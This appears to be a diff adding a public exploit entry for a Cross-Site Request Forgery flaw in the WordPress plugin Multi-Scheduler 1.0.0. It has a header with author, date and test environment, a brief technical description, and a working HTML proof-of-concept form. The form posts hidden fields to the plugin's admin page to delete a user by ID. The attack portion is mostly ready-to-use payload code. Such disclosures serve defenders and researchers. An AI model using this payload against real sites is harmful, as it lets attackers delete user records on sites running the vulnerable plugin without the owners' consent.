@@ -1,0 +1,23 @@
+# Exploit Title: WordPress Plugin Multi-Scheduler 1.0.0 - Cross-Site Request Forgery (Delete User)
+# Google Dork: N/A
+# Date: 2020-05-21
+# Exploit Author: UnD3sc0n0c1d0
+# Vendor Homepage: https://www.bdtask.com/
+# Software Link: https://downloads.wordpress.org/plugin/multi-scheduler.1.0.0.zip
+# Category: Web Application
+# Version: 1.0.0
+# Tested on: CentOS 7 / WordPress 5.4.1
+# CVE : N/A
+
+# 1. Technical Description:
+The Multi-Scheduler plugin 1.0.0 for WordPress has a Cross-Site Request Forgery (CSRF) vulnerability 
+in the forms it presents, allowing the possibility of deleting records (users) when an ID is known.
+  
+# 2. Proof of Concept (PoC):
+<html>
+<form method="POST" action="http://[TARGET]/wp-admin/admin.php?page=msbdt_professional">
+<input type="hidden" value="[ID]" name="pro_delete_id"><br>
+<input type="hidden" value="Delete" name="professional_delete">
+<input type="submit" value="Delete user">
+</form>
+</html>
